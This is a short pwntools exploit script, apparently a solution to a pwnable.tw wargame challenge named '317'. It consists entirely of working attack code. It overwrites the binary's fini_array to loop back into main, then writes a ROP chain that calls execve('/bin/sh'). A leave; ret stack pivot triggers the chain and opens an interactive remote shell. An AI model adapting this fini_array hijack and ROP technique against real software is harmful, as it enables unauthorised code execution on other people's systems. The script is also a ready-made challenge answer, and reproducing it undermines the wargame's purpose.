from pwn import *
context.log_level = 'debug'

#p = process("./317")
p = remote("chall.pwnable.tw",10105)
elf = process("./317")

fini_array = 0x4B40F0
main_addr = 0x401B6D
libc_csu_fini = 0x402960
esp = fini_array + 0x10
leave_ret = 0x401C4B
ret = 0x401016
 
rop_syscall = 0x471db5
rop_pop_rax = 0x41e4af
rop_pop_rdx = 0x446e35
rop_pop_rsi = 0x406c30
rop_pop_rdi = 0x401696
bin_sh_addr = 0x4B419A
 
def write(addr,data):
    p.recv()
    p.send(str(addr))
    p.recv()
    p.send(data)
 
def exp():
    # hijack fini_array
    #gdb.attach(p)
    write(fini_array,p64(libc_csu_fini) + p64(main_addr))
 
    # rop chain
    write(bin_sh_addr,"/bin/sh\x00")
    write(esp,p64(rop_pop_rax))
    write(esp+8,p64(0x3b))
    write(esp+16,p64(rop_pop_rdi))
    write(esp+24,p64(bin_sh_addr))
    write(esp+32,p64(rop_pop_rdx))
    write(esp+40,p64(0))
    write(esp+48,p64(rop_pop_rsi))
    write(esp+56,p64(0))
    write(esp+64,p64(rop_syscall))
 
    # stack pivoting
    write(fini_array,p64(leave_ret) + p64(ret))
 
if __name__ == '__main__':
    exp()
    p.interactive()